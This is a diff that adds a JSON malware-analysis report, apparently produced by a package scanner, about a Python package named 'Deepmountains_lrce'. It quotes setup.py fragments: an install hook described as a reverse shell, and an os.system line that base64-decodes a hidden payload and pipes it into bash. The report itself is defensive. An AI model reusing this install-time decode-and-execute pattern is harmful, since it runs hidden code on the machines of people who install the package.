@@ -1,0 +1,35 @@
+{
+  "package_metadata": {
+    "name": "Deepmountains_lrce",
+    "version": "0.0.1",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [],
+    "process_spawns": [
+      "os.system('echo %s|base64 -d|bash' % encoded.decode())"
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "setup(name='Deepmountains_lrce',\n      version='0.0.1',\n      description=\"install this module then reverse shell\", \n      author=\"dpm\", \n      py_module=[\"deepmountains.hello\"],\n      cmdclass={'install': CustomInstall}\n     )\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "    os.system('echo %s|base64 -d|bash' % encoded.decode())\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.9,
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-78",
+      "CWE-94"
+    ]
+  }
+}
